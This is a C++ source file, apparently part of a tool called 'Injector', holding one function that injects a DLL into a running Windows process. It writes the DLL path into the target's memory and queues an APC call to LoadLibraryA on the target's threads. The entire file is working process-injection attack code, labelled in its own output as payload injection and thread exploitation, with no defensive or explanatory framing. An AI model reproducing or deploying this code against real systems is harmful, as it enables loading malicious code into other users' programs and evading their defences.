#include "Injector.h"

bool QueueUserAPC_Type3(LPCSTR DllPath, HANDLE hProcess, DWORD processId) {

	LPVOID LoadLibAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	if (!LoadLibAddr) {
		printf("Could note locate real address of LoadLibraryA!\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("LoadLibraryA is located at real address: 0X%p\n", (void*)LoadLibAddr);
	Sleep(1000);

	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath), MEM_COMMIT, PAGE_READWRITE);

	if (!pDllPath) {
		printf("Could not allocate Memory in target process\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory allocated at: 0X%p\n", (void*)pDllPath);
	Sleep(1000);


	BOOL Written = WriteProcessMemory(hProcess, pDllPath, LPVOID(DllPath), strlen(DllPath), NULL);

	if (!Written) {
		printf("Could not write into the allocated memory\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory was written at address : 0x%p\n", (void*)pDllPath);
	Sleep(1000);

	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;

	// Take snaphsot of all running threads
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (hThreadSnap == INVALID_HANDLE_VALUE) {
		printf("Could not get snapshot of threads\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	// set structure size
	te32.dwSize = sizeof(THREADENTRY32);
	DWORD threadId;

	if (!Thread32First(hThreadSnap, &te32)) {
		printf("Could not get first thread\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	do {

		if (te32.th32OwnerProcessID == processId) {

			threadId = te32.th32ThreadID;
			printf("Exploitng thread with ID %d", threadId);
			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);

			if (hThread) {

				printf("Thread %d is opened succesfully\n", threadId);
				Sleep(1000);
				DWORD dwResult = QueueUserAPC((PAPCFUNC)LoadLibAddr, hThread, (ULONG_PTR)pDllPath);

				if (dwResult) {
					printf("Payload Injected successfully in thread %d\n", threadId);
					system("PAUSE");
					return true;
				}
				else
				{
					printf("Error in calling QueueUSerAPC() for thread %d!... Continuing to try other threads\n", threadId);
					system("PAUSE");
				}

			}
			else {
				printf("Error in Getting found thread ID\n");
				printf("LastError : 0X%x\n", GetLastError());
				system("PAUSE");
				return false;
			}
		}

	} while (Thread32Next(hThreadSnap, &te32));

	if (!threadId)
		printf("No Thread for use in process %d\n", processId);

	CloseHandle(hThreadSnap);

	return false;

}